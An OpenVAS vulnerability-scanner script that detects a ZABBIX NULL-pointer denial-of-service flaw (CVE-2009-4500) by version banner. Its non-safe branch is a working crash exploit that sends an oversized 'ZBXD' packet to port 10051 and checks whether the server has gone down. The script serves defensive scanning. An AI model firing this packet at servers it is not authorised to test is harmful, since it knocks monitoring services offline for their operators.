###############################################################################
# OpenVAS Vulnerability Test
# $Id: zabbix_37308.nasl 5231 2017-02-08 11:52:34Z teissa $
#
# ZABBIX 'process_trap()' NULL Pointer Dereference Denial Of Service Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "ZABBIX is prone to a denial-of-service vulnerability because
of a NULL-pointer dereference.

Successful exploits may allow remote attackers to cause denial-of-
service conditions. Given the nature of this issue, attackers may also
be able to run arbitrary code, but this has not been confirmed.

Versions prior to ZABBIX 1.6.6 are vulnerable.";

tag_solution = "Updates are available. Please see the references for details.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.100404";
CPE = "cpe:/a:zabbix:zabbix";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version("$Revision: 5231 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-08 12:52:34 +0100 (Wed, 08 Feb 2017) $");
 script_tag(name:"creation_date", value:"2009-12-17 19:46:08 +0100 (Thu, 17 Dec 2009)");
 script_cve_id("CVE-2009-4500");
 script_bugtraq_id(37308);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

 script_name("ZABBIX 'process_trap()' NULL Pointer Dereference Denial Of Service Vulnerability");

 script_xref(name : "URL" , value : "http://www.zabbix.com/index.php");
 script_xref(name : "URL" , value : "http://secunia.com/advisories/37740/");
 script_xref(name : "URL" , value : "https://support.zabbix.com/browse/ZBX-993");

 script_tag(name:"qod_type", value:"remote_banner");
 script_category(ACT_MIXED_ATTACK);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("zabbix_detect.nasl","zabbix_web_detect.nasl");
 script_require_ports("Services/www","Services/zabbix_server", 80, 10051);
 script_mandatory_keys("Zabbix/installed");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

if(safe_checks()) {

  include("http_func.inc");
  include("version_func.inc");
  include("host_details.inc");

  if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
  if(!get_port_state(port))exit(0);

  if(!vers = get_app_version(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

  if(zabbix_port = get_kb_item("Services/zabbix_server")) {
    port = zabbix_port;
  }  

  if(version_is_less(version: vers, test_version: "1.6.6")) {
    security_message(port:port);
    exit(0);
  }  

} else {  

  port = get_kb_item("Services/zabbix_server");
  if(!port)port = 10051;
  if(!get_port_state(port))exit(0);

  soc = open_sock_tcp(port);
  if(!soc)exit(0);

  header = string("ZBXD") + raw_string(0x01);
  data  += crap(data:"A", length: 2500);
  data  += string(":B");
  size   = strlen(data);

  req = header + size + data;

  send(socket:soc, data:req);
  close(soc);

  sleep(5);

  soc1 = open_sock_tcp(port);

  if(!soc1) {
    security_message(port:port);
    exit(0);
  }

  close(soc1);
}

exit(0);

